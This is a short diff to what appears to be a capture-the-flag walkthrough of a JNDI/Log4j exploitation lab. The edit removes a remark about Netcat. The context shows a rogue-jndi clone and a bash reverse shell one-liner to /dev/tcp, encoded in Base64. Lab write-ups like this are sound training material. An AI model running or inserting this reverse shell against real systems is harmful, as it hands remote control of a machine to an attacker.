@@ -155,7 +155,7 @@ git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mv
 
 ![rogue-jndi](./Screenshots/unifiedjndi2.png)
 
-After compiling the JAR file, we'll need to create a command to send the `reverse shell`. Since this system doesn't have `Netcat` by default, we'll need to craft a `reverse shell command` and then encode it in `Base64`. Use the provided one-liner to do this:
+After compiling the JAR file, we'll need to create a command to send the `reverse shell`. We'll need to craft a `reverse shell command` and then encode it in `Base64`. Use the provided one-liner to do this:
 
 ```
 echo 'bash -c bash -i >&/dev/tcp/{your tun0 ip}/{port of your choice} 0>&1' | base64
